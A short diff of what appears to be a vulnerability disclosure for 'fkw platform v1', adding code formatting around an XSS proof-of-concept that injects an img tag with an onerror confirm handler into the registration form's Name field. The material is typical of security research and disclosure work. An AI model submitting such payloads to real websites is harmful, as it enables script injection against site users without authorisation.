@@ -28,9 +28,11 @@ fkw platform v1
 
 Submit the registration information in POST mode, enter the following payload in the "Name" field in the info parameter.
 
+```
 Test"><img src=x onerror=confirm(/xss/)>
+```
 
- 
+
 
 [Vulnerability verification]
 
